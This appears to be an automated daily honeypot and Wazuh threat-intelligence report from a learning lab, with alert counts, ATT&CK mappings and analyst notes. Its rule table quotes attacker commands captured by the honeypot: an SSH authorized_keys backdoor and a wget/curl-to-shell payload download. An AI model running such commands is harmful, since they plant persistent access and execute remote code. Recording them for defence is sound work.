# LearningLab01 Daily Threat Intelligence Report — 2026-10-18

Generated: 2026-10-18T13:15:05.055Z

Report window: 2026-10-17T13:15:05.037Z through 2026-10-18T13:15:05.037Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 392,405 |
| Attack-related alerts | 36,745 |
| Honeypot interactions | 380,832 |
| Authentication failures | 3,808 |
| Authentication successes | 482 |
| Critical alerts | 182 |
| High alerts | 525 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 182 critical-severity alerts require priority review.
- 525 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 7.90:1.
- Country attribution currently covers only 0.22% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (285,705 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 182 | 0.05% |
| High | 525 | 0.13% |
| Medium | 2,632 | 0.67% |
| Low | 389,066 | 99.15% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 3,808
- Authentication successes: 482
- Failure-to-success ratio: 7.90:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 30,145 | 82.04% |
| Payload delivery | 30,145 | 82.04% |
| Authentication failure | 3,808 | 10.36% |
| Command execution | 1,708 | 4.65% |
| Reconnaissance | 521 | 1.42% |
| Network scan | 291 | 0.79% |
| Malware | 122 | 0.33% |
| Web attack | 85 | 0.23% |
| SMTP attack | 35 | 0.10% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 875 alerts, representing 0.22% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 391,530 | 99.78% | Not geolocated |
| Germany | 333 | 0.08% | ████████████████████ |
| Romania | 166 | 0.04% | ██████████ |
| United Kingdom | 149 | 0.04% | █████████ |
| Bulgaria | 127 | 0.03% | ████████ |
| United States | 47 | 0.01% | ███ |
| Hong Kong | 20 | 0.01% | █ |
| Singapore | 13 | 0.00% | █ |
| Hungary | 6 | 0.00% | █ |
| Japan | 4 | 0.00% | █ |
| India | 3 | 0.00% | █ |
| Iran | 3 | 0.00% | █ |
| Seychelles | 2 | 0.00% | █ |
| Australia | 1 | 0.00% | █ |
| Belgium | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 87 |
| Execution | 14 |
| Impact | 11 |
| Command and Control | 4 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 87 |
| Command and Scripting Interpreter | 14 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 285,705 | T-Pot RDP connection from [IP address] to port 3389. | tpot (285,705) |
| 110204 | 4 | 41,167 | T-Pot Honeytrap connection from [IP address] to port 5903 | tpot (41,167) |
| 110205 | 6 | 30,020 | T-Pot Honeytrap received a payload from [IP address] | tpot (30,020) |
| 110209 | 5 | 16,534 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (16,534) |
| 110207 | 5 | 4,771 | T-Pot SentryPeer SIP activity from [IP address]:62817, method INVITE | tpot (4,771) |
| 110101 | 3 | 4,660 | Cowrie SSH connection from [IP address]. | tpot (4,660) |
| 110102 | 5 | 3,808 | Cowrie failed login from [IP address] using username root. | tpot (3,808) |
| 110104 | 7 | 1,508 | Cowrie captured a command from [IP address]: cat /proc/cpuinfo \| grep model \| grep name \| wc -l | tpot (1,508) |
| 110201 | 4 | 752 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (752) |
| 110219 | 4 | 607 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/ HTTP/1.1" 404 - | tpot (607) |
| 110214 | 9 | 285 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (285) |
| 533 | 7 | 234 | Listened ports status (netstat) changed (new port opened or closed). | tpot (234) |
| 110215 | 4 | 230 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (230) |
| 110216 | 4 | 218 | T-Pot Mailoney received SMTP command from [IP address]:   | tpot (218) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110103 | 10 | 191 | Cowrie accepted login from [IP address] using username root. | tpot (191) |
| 110109 | 13 | 182 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (182) |
| 110221 | 7 | 170 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (170) |
| 5502 | 3 | 162 | PAM: Login session closed. | tpot (160), wazuh (2) |
| 203 | 9 | 147 | Agent event queue is full. Events may be lost. | tpot (147) |
| 110212 | 10 | 125 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (125) |
| 110105 | 12 | 104 | Cowrie captured a file download from [IP address]. | tpot (104) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110220 | 8 | 96 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (96) |
| 110106 | 10 | 87 | Cowrie detected repeated failed logins from [IP address]. | tpot (87) |
| 110223 | 5 | 76 | T-Pot HoneyAML received  request from  to  on port . | tpot (76) |
| 202 | 7 | 61 | Agent event queue is 90% full. | tpot (61) |
| 205 | 3 | 61 | Agent event queue is back to normal load. | tpot (61) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110217 | 7 | 35 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (35) |
| 110208 | 7 | 23 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5061 | tpot (23) |
| 110108 | 12 | 14 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (14) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110224 | 7 | 9 | T-Pot HoneyAML received an HTTP POST from [IP address] to /api/v1/account/forgot-password. | tpot (9) |
| 110211 | 9 | 6 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (6) |
| 110107 | 12 | 4 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (4) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
